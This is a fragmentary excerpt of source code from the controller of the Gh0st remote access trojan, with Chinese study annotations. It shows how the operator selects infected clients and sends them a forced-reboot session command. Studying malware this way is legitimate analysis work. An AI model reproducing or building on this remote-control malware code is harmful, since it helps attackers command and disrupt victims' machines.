...
void CGh0stView::SendSelectCommand(PBYTE pData, UINT nSize)
{
	...
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);                          //lang2.1_2
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem); //从列表条目中取出ClientContext结构体
...
{
	// TODO: Add your command handler code here
	BYTE bToken[2];                                    //lang2.1_1
	bToken[0] = COMMAND_SESSION;                        //赋值
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	 //调用发送函数  跟进SendSelectCommand
}
